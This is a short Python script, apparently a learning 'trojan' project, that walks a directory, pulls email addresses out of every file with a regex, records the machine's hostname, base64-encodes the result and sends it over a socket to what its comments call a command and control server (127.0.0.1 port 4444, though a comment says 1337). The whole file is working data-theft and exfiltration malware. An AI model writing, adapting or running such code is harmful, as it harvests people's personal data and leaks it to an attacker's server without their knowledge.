import requests
import socket
import base64
import json
import re
import os


def main():
    # get hostname of the machine
    hostname = socket.gethostname()

    email_addresses_list = []
    for root, subdirs, files in os.walk("/home/abeni/Downloads/Clone/python-trojan"):
        for file in files:
            file_fd = open("{}/{}".format(root, file), "r")
            try:
                # read the contents of each file
                file_contents = file_fd.read().strip()

                # search for email addresses
                email_addresses = re.findall(
                    r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)

                if len(email_addresses) > 0:
                    email_addresses_list = email_addresses_list + email_addresses

                file_fd.close()
            except:
                pass

    # encode data to json and send them to command and control server
    data = {
        "machine_hostname": hostname,
        "email_addresses_found": email_addresses_list
    }

    # base64 encode the json data
    encoded_data = base64.b64encode(json.dumps(data).encode())

    # create a socket object
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # connect to command and control server on port 1337
        s.connect(("127.0.0.1", 4444))
        s.send(encoded_data)
        # data = s.recv(1024)
        s.close()


if __name__ == "__main__":
    main()
